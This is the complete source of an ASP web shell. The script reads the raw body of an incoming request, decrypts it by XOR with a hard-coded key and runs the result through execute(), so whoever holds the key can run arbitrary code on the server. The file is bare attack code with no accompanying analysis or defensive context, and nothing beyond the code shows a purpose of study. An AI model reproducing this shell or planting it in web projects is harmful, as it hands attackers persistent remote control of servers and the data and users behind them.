<%
Response.CharSet = "UTF-8"
Function Decrypt(data)
k="e45e329feb5d925b"
size=lenb(data)
For i=1 To size
result=result&Chr(ascb(midb(data,i,1)) Xor Asc(Mid(k,(i and 15)+1,1)))
Next
Decrypt=result
End Function

size=Request.TotalBytes
content=Request.BinaryRead(size)
execute(Decrypt(content))
%>